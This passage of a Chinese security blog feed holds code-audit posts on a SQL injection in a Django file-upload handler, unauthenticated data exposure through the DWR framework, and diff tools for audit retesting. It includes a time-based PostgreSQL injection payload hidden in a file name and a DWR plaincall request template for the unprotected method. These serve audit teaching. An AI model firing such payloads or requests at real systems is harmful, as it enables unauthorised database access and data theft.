title="缺陷代码分析"></a>缺陷代码分析</h2><p>通过url的映射关系，找到了文件上传的入口。<br><img src="/img/20210318-01.png" alt="20210318-01"><br>跟踪Upload对象，查看post方法实现<br><img src="/img/20210318-03.png" alt="20210318-03"><br>分析文件上传post方法接口，第338行获取上传文件对象，第342行将上传文件文件名赋值给server_file_name，进过文件类型和空文件判断后，调用351行，拼接sql查询语句，调用第353行查询当前文件名是否存在，主要目的是文件重复判断。由于使用django objects.raw这种可以直接使用原生sql查询的方式，通过拼接sql语句并且系统中未设置任何sql过滤器，所以此处存在sql注入风险。</p><h3 id="JSON-函数和操作符"><a href="#JSON-函数和操作符" class="headerlink" title="JSON 函数和操作符"></a>JSON 函数和操作符</h3><p>看到下面这条语句，第一反应是肯定有问题，但是对postgresql不怎么了解，对其sql语法也是一知半解，以下只是个人总结记录，看官请自行判断。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">sql = &quot;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> %s.honey_trap_template <span class="hljs-keyword">where</span> (trap_info::json#&gt;&gt;<span class="hljs-string">&#x27;&#123;file_name&#125;&#x27;</span>)::text = <span class="hljs-string">&#x27;%s&#x27;</span><span class="hljs-string">&quot; % (</span><br><span class="hljs-string">                SCHEMA_NAME, server_file_name)</span><br></code></pre></td></tr></table></figure><p>#&gt;&gt; 操作符是以文本形式获取在指定路径的 JSON 对象，例如：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">&#x27;&#123;<span class="hljs-string">&quot;a&quot;</span>:[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<span class="hljs-string">&quot;b&quot;</span>:[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>]&#125;&#x27;::json<span class="hljs-comment">#&gt;&gt;&#x27;&#123;a,2&#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>运行的结果为3</p><p>相当于直接使用json对象，来处理数据，对于 (trap_info::json#&gt;&gt;’{file_name}’)::text ，将trap_info转换成json对象，获取file_name数值，并将file_name参数格式化成text。</p><h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>使用burpsuite构建数据包进行测试，通过修改filename参数，确定注入点（主要是我前期构造数据包一直以为name对应代码中的的文件名，发现不起作用才发现自己找错地方了，暴露了自己垃圾测试功底）。<br><img src="/img/20210318-04.png" alt="20210318-04"><br>通过提交恶意参数，使系统抛出异常。<br><img src="/img/20210318-05.png" alt="20210318-05"><br>需要注意一点儿，系统会先对文件名的后缀（文件类型）进行判断，所以构建在payload及数据包，需要保留合法的后缀（文件类型），这里有zip、office系列。这里有一个基于时间延迟的payload，供大家学习</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;;<span class="hljs-keyword">SELECT</span> PG_SLEEP(<span class="hljs-number">5</span>)<span class="hljs-comment">--.zip</span><br></code></pre></td></tr></table></figure><p>sqlmap运行截图<br><img src="/img/20210318-06.png" alt="20210318-06"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>该接口除了sql注入，同样对上传文件大小的上限未做限制，通过恶意上传大文件，可导致磁盘存储满载，进而导致拒绝服务。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://docs.djangoproject.com/zh-hans/3.1/topics/db/sql/">https://docs.djangoproject.com/zh-hans/3.1/topics/db/sql/</a>【执行原生sql查询】</li><li><a href="http://www.postgres.cn/docs/10/functions-json.html">http://www.postgres.cn/docs/10/functions-json.html</a>【 JSON 函数和操作符】</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dwr框架代码审计</title>
    <link href="/2021/03/01/2021-03-01-dwr-code-audit/"/>
    <url>/2021/03/01/2021-03-01-dwr-code-audit/</url>
    
    <content type="html"><![CDATA[<p>dwr框架代码审计</p><hr><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>在做测试的过程中发现一个老系统提交的请求包比较奇怪，通过检索，发现是早期java web研发人员常用的DWR框架，dwr框架比较古老，可以帮助用户实现Ajax网站，可以让你在浏览器中的Javascript代码调用Web服务器上的Java，就像在Java代码就在浏览器中一样。</br><br><img src="/img/20210301-01.png" alt="20210301-01"></p><p>DWR 主要包括两部分：</p><pre><code>- 在服务器上运行的 Servlet 来处理请求并把结果返回浏览器。- 运行在浏览器上的 Javascript，可以发送请求，并动态改变页面。</code></pre><p>DWR 会根据你的 Java 类动态的生成Javascript代码。这些代码让你感觉整个Ajax调用都是在浏览器上发生的，但事实上是服务器执行了这些代码，DWR负责数据的传递和转换。DWR有些过时了，目前可以直接使用jquery来实现ajax请求。</p><h2 id="DWR框架介绍"><a href="#DWR框架介绍" class="headerlink" title="DWR框架介绍"></a>DWR框架介绍</h2><p>使用maven或者直接从官网获取jar包，将jar包放入WEB-INF的lib文件夹下。同时，dwr依赖于commons-logging.jar<br>web.xml配置文件如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dwr-invoker<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>uk.ltd.getahead.dwr.DWRServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>debug<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br> <br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>dwr-invoker<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/dwr/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>dwr配置如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">dwr</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">    <span class="hljs-string">&quot;-//GetAhead Limited//DTD Direct Web Remoting 3.0//EN&quot;</span></span><br><span class="hljs-meta">    <span class="hljs-string">&quot;http://getahead.org/dwr/dwr30.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dwr</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">allow</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">create</span> <span class="hljs-attr">creator</span>=<span class="hljs-string">&quot;new&quot;</span> <span class="hljs-attr">javascript</span>=<span class="hljs-string">&quot;JDate&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;class&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;java.util.Date&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">create</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">create</span> <span class="hljs-attr">creator</span>=<span class="hljs-string">&quot;new&quot;</span> <span class="hljs-attr">javascript</span>=<span class="hljs-string">&quot;Demo&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;class&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;your.java.Bean&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">create</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">allow</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dwr</span>&gt;</span><br></code></pre></td></tr></table></figure><p>dwr.xml 是 dwr 的核心配置文件，主要的标签有：&lt;converter&gt;、&lt;convert&gt;、&lt;create&gt;这三个标签。&lt;create&gt; 标签是 dwr 中重要的标签，用来描述 java（服务器端） 与 javascript （客户端）的交互方式。其基本格式如下：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;allow&gt;<br>  &lt;create creator<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span> javascript<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span> scope<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span>&gt;<br>    &lt;param name<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span> value<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span>/&gt;<br>    &lt;auth method<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span> role<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span>/&gt;<br>    &lt;exclude method<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span>/&gt;<br>    &lt;include method<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span>/&gt;<br>  &lt;/create&gt;<br>  ...<br>&lt;/allow&gt;<br></code></pre></td></tr></table></figure><p>其中，creator 和 javascript 是必须属性，其他可以忽略。creator 包含有以下几个值：　　</p><ul><li>new：Java用“new”关键字创造对象</li><li>none：它不创建对象  (v1.1+)</li><li>scripted：通过BSF使用脚本语言创建对象，例如BeanShell或Groovy</li><li>spring：通过Spring框架访问Bean</li><li>struts：使用Struts的FormBean  (v1.1+)</li><li>jsf：使用JSF的Bean  (v1.1+)</li><li>pageflow：访问Weblogic或Beehive的PageFlow  (v1.1+)</li><li>ejb3：使用EJB3 session bean  (v2.0+)</li></ul><p>这里初学，实用java new创建对象。<br>页面配置<br>页面需要引入3个JS</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&lt;%=ctxPath%&gt;/dwr/interface/Chat.js&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&lt;%=ctxPath%&gt;/dwr/engine.js&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&lt;%=ctxPath%&gt;/dwr/util.js&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>其中 engine.js 必须要，如果需要用到dwr提供的一些方便的工具要引用util.js ，然后是dwr自动生成的js文件。名字和 dwr.xml 中 create 标签的 javascript 属性值一样，且必须是 dwr&#x2F;interface 开头的目录，详细请查阅官方文档，这里不过多说明。</p><h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>DWR框架对于审计人员比较友好，通过分析web.xml和dwr配置文件，我们可以迅速定位到源代码的位置。<br>首先分析web.xml<br><img src="/img/20210301-02.png" alt="20210301-02"><br>获取dwr配置文件目录<br><img src="/img/20210301-03.png" alt="20210301-03"><br>这里查找scriptName为：CaUsermanAjax，方法名为：getTysfyhbList的具体实现的代码。<br>本次审计的dwr框架配置文件使用spring模式，使用spring框架访问bean,并且使用dwr-signatures的配置模式，signatures段使DWR能确定集合中存放的数据类型。<br>signatures段允许我们暗示DWR应该用什么类型去处理。格式对以了解JDK5的泛型的人来说很容易理解。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">&lt;signatures&gt;<br>  &lt;![CDATA[<br>    <span class="hljs-keyword">import</span> java.util.<span class="hljs-built_in">Map</span>;<br>    <span class="hljs-keyword">import</span> com.zfsoft.cacommon.username.ajax.UsermanAjax;<br>    CaUsermanAjax.getYrdgxxbList(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,<span class="hljs-built_in">String</span>&gt; condition);<br>    CaUsermanAjax.getTysfyhbList(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,<span class="hljs-built_in">String</span>&gt; condition);<br>    CaUsermanAjax.getOnlineUserList(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,<span class="hljs-built_in">String</span>&gt; condition);<br>    CaUsermanAjax.getZhmmxxbList(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>,<span class="hljs-built_in">String</span>&gt; condition);<br>    ]]&gt;<br>&lt;/signatures&gt; <br></code></pre></td></tr></table></figure><p><signatures>标签是用来声明java方法中List、Set或者Map参数所包含的确切类，以便java代码作出判断。<br>通过查找com.zfsoft.cacommon.username.ajax.UsermanAjax对象，我们找到getTysfyhbList方法。<br><img src="/img/20210301-04.png" alt="20210301-04"><br>通过对比捕获的数据包我们可以了解到数据包的格式<br><img src="/img/20210301-05.png" alt="20210301-05"></p><p>请求地址为:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">http://ipaddress/dwr/call/plaincall/</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">scriptName</span> &#125;&#125;</span><span class="language-xml">.</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">methodName</span> &#125;&#125;</span><span class="language-xml">.dwr</span><br></code></pre></td></tr></table></figure><p>http body:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">callCount=1</span><br><span class="language-xml">page=</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">任意JSP地址均可</span> &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">httpSessionId= </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">可留空</span> &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">scriptSessionId=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">Cookie中的</span> DWRSESSION&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">c0-scriptName=</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">scriptName</span> &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">c0-methodName=</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">methodName</span> &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">c0-id=0</span><br><span class="language-xml">c0-e1=number:0  设置参数</span><br><span class="language-xml">c0-e2=number:15</span><br><span class="language-xml">c0-e3=string:</span><br><span class="language-xml">c0-param0=string(类型): 值 </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">参数</span> <span class="hljs-number">1</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">也可以写成：c0-param0=Object_Object:&#123;start:reference:c0-e1,...&#125;start是参数名，后面是参数值的来源。</span><br><span class="language-xml">batchId=0</span><br></code></pre></td></tr></table></figure><p>回过头，我们分析本次审计的源代码，其中TysfyhbDAO对象中的list方法会返回用户的数据信息，未经过处理，直接返回数据库中存储的用户敏感信息。在请求调用的整个过程中，未发现有相关的权限校验，存在未授权访问的风险。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://directwebremoting.org/dwr/index.html">http://directwebremoting.org/dwr/index.html</a>【dwr wiki】</li><li><a href="https://xz.aliyun.com/t/8431">https://xz.aliyun.com/t/8431</a></li><li><a href="https://xz.aliyun.com/t/2147">https://xz.aliyun.com/t/2147</a></li><li><a href="https://blog.csdn.net/smileyan9/article/details/80545795">https://blog.csdn.net/smileyan9/article/details/80545795</a></li><li><a href="https://bbs.csdn.net/topics/390981028">https://bbs.csdn.net/topics/390981028</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计复测代码对比技巧</title>
    <link href="/2021/01/20/2021-01-20-code-diff/"/>
    <url>/2021/01/20/2021-01-20-code-diff/</url>
    
    <content type="html"><![CDATA[<p>代码审计复测代码对比技巧</p><hr><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>在甲方审计现场遇到一个傻叉的需求，要求对审计的源代码做一个全量的复测，提出这个需求的目的主要是对客户目前修复的内容全量做检测，这部分修复的内容包括对我们审计发现问题的修复和渗透测试发现的问题修复的代码及业务迭代的代码。正常源代码复测，只是对代码审计发现的问题进行复测，主要的目的是由于审计的效率和乙方项目成本考虑。针对客户这种需求，也得做，不然会被(没)投(饭)诉(吃)。</p><h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><p>从客户的svn或者git工程上导出截止上次审计到现在改动的文件列表，如果直接导出所有的日志，审计人员一个一个对比，估计会疯掉，这里只导出变更文件即可。</p><h3 id="svn"><a href="#svn" class="headerlink" title="svn"></a>svn</h3><p>通过 svn 命令行(TortoiseSVN不行, 需要先安装 svn 命令行工具)是可以获得这个列表的.<br>命令格式如下:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">svn diff -r REVNO<span class="hljs-function">:HEAD</span> <span class="hljs-params">--summarize</span> http:<span class="hljs-string">//svn-url</span><br></code></pre></td></tr></table></figure><p>例如<br>想检查从 530版本 开始到目前所有改动文件的列表</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">svn diff -r <span class="hljs-number">530</span><span class="hljs-symbol">:HEAD</span> --summarize <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/svnserver/project</span> &gt; changedfiles.txt<br></code></pre></td></tr></table></figure><p>可以简写成这样</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">svn diff -<span class="hljs-attribute">r</span> <span class="hljs-number">530</span> <span class="hljs-attr">--summarize</span> https://svnserver/project &gt; changedfiles.txt<br></code></pre></td></tr></table></figure><p>或者你只知道需要检查版本的日期, 这就相当于检查从 2020-06-06(上次发版日期) 开始到目前(此次发版日期)所有的文件改动</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">svn</span> diff -r &#123;<span class="hljs-number">2020</span>-<span class="hljs-number">06</span>-<span class="hljs-number">06</span>&#125; --summarize https://svnserver/project &gt; changedfiles.txt<br></code></pre></td></tr></table></figure><p>或者日期区间</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">svn</span> diff -r &#123;<span class="hljs-number">2020</span>-<span class="hljs-number">06</span>-<span class="hljs-number">04</span>&#125;:&#123;<span class="hljs-number">2020</span>-<span class="hljs-number">01</span>-<span class="hljs-number">20</span>&#125; --summarize https://svnserver/project &gt; changedfiles.txt<br></code></pre></td></tr></table></figure><h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>git和svn略有区别，git通过diff命令来获取版本之间的变动文件列表</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">//git</span> diff <span class="hljs-params">--stat</span> 版本号1 版本号2<br><span class="hljs-string">//</span>对比两个版本 两个版本号位置不影响（建议版本号1为当前版本号  方便下次上线直接使用）<br></code></pre></td></tr></table></figure><p>版本号可以通过 <code>git log</code> 命令来获取，如果导出一段时间内的文件变动，建议通过查找log中的对应时间关联的版本号使用以上命令来导出。<br>例如：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">git diff --stat  <span class="hljs-number">4</span>ac<span class="hljs-number">2</span>f<span class="hljs-number">071</span>cb<span class="hljs-number">5</span><span class="hljs-keyword">c</span><span class="hljs-number">0</span>d<span class="hljs-number">1e5</span>a<span class="hljs-number">87</span>a<span class="hljs-number">7692</span>b<span class="hljs-number">5e61</span>fcc<span class="hljs-number">2</span><span class="hljs-keyword">c</span><span class="hljs-number">5</span>aa<span class="hljs-number">24</span> <span class="hljs-keyword">c</span><span class="hljs-number">6e8</span>a<span class="hljs-number">140</span>bcae<span class="hljs-number">3647807</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>af<span class="hljs-number">95e13</span>fb<span class="hljs-number">3076001</span>f<span class="hljs-number">7</span>e &gt; changedfiles.txt<br></code></pre></td></tr></table></figure><h2 id="使用代码对比工具"><a href="#使用代码对比工具" class="headerlink" title="使用代码对比工具"></a>使用代码对比工具</h2><p>一般客户提供的文件都是不全的，客户不会提供完整的项目文件，这里吐槽一下，这就是对乙方人员的不尊重，东西都不准备好，还一个劲的催项目进度，要求高质量审计，这就是在公开耍流氓，说多了都是泪，还得干活，钱难挣，奥里给难吃。<br>这里博主尝试了几款代码比较工具，推荐给各位审计的小伙伴。</p><h3 id="Winmerge"><a href="#Winmerge" class="headerlink" title="Winmerge"></a>Winmerge</h3><p>是一款运行于Windows系统下的免费的文件比较合并工具，非常适用于确定不同版本的文件间的改变以及合并这些改变，尤其是在有多人编辑同一文件的情况下。<br><img src="/img/20210120-01.png" alt="20210120-01"><br><img src="/img/20210120-02.png" alt="20210120-02"></p><blockquote><p>特性：</p></blockquote><pre><code>*   对文本文档的可视化编辑以及合并*   语法高亮功能*   可以处理DOS、UNIX和MAC中的文本文件*   支持Unicode*   在不同的栏中显示当前文件的差异*   高亮差异*   在目录比较中使用文件过滤器*   在文件比较中检测移动过的段落*   在外壳扩展中集成*   通过7-Zip支持压缩文件*   支持插件功能*   通过DLL支持本地化界面*   支持手动对齐文本 (Syncronization points])*   可将比较画面结果产生HTML报告(Create HTML reports from file compare)*   支持三方比较(3-Way Compare)*   支持图片比较(Image compare), 文件夹比较(Folder compare) 文件比较(File compare)</code></pre><p>下载地址：<a href="https://winmerge.org/">https://winmerge.org/</a></p><h3 id="Diffuse"><a href="#Diffuse" class="headerlink" title="Diffuse"></a>Diffuse</h3><p>在命令行中，Diffuse 的速度很快，支持像 C++、Python、Java、XML 等语言的语法高亮显示。可视化比较，非常直观，支持两相比较和三相比较。小工具还得安装，这点就有点儿恶心。最要命的是只能对比文件，不能对比目录，这点儿对审计人员不友好，不推荐使用。<br><img src="/img/20210120-03.png" alt="20210120-03"></p><p>下载地址：<a href="https://sourceforge.net/projects/diffuse/">https://sourceforge.net/projects/diffuse/</a></p><h3 id="Beyond-Compare"><a href="#Beyond-Compare" class="headerlink" title="Beyond Compare"></a>Beyond Compare</h3><p>Beyond Compare是一套由Scooter Software推出的内容比较工具软件。除了可以作文件比较以外，还可以比对文件目录、FTP目录及压缩包的内容等。因为这些功能，Beyond Compare被应用于版本控制及资料同步的工作上，该工具支持windows、Linux、Mac，跨平台做的不错，对比功能挺挺强大，需要安装，有些强迫症。</p><p><img src="/img/20210120-04.png" alt="20210120-04"></p><p>通过颜色区别文件异同：</p><p><img src="/img/20210120-05.png" alt="20210120-05"></p><p><img src="/img/20210120-06.png" alt="20210120-06"></p><p>下载地址：<a href="https://www.scootersoftware.com/download.php">https://www.scootersoftware.com/download.php</a></p><h3 id="Code-Compare"><a href="#Code-Compare" class="headerlink" title="Code Compare"></a>Code Compare</h3><p>Code Compare是一个免费的代码对比工具，旨在比较和合并不同的文件和文件夹。Code Compare与所有流行的源代码托管系统集成：TFS，SVN，Git，Mercurial和Perforce。Code Compare既作为独立文件差异工具提供，又可以为Visual Studio、IDEA等提供扩展组件，同样也需要安装，不说什么了。<br><img src="/img/20210120-07.png" alt="20210120-07"></p><p>特点：<br>    * 先进的差异目录比较实用程序<br>    * 对添加，删除和修改的文件进行颜色编码<br>    * 排除或包括某些文件类型的过滤选项<br>    * 即时打开单个文件比较文件<br>    * 显示选项，以更好地比较结果分析<br>    * 批处理文件从窗格复制到窗格或复制到选定的文件夹<br><img src="/img/20210120-08.png" alt="20210120-08"></p><p>对于展示代码的异同和语义分析，博主还是很喜欢的，推荐给代码审计的小朋友使用<br><img src="/img/20210120-09.png" alt="20210120-09"></p><p>下载地址：<a href="https://www.devart.com/codecompare/download.html#anchorDowload">https://www.devart.com/codecompare/download.html#anchorDowload</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>还有不少文件对比工具，这里我就详细介绍以上这几款，总有一款适合你，主要目的还是应付客户奇葩需求，提高审计效率混口饭吃。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://zh.wikipedia.org/wiki/WinMerge">https://zh.wikipedia.org/wiki/WinMerge</a>【WinMerge wikipedia】</li><li><a href="https://blog.csdn.net/xishining/article/details/106204776">https://blog.csdn.net/xishining/article/details/106204776</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Code Audit</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Code</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>这大概就是生活</title>
    <link href="/2020/12/15/2020-12-15-personal-life/"/>
    <url>/2020/12/15/2020-12-15-personal-life/</url>
    
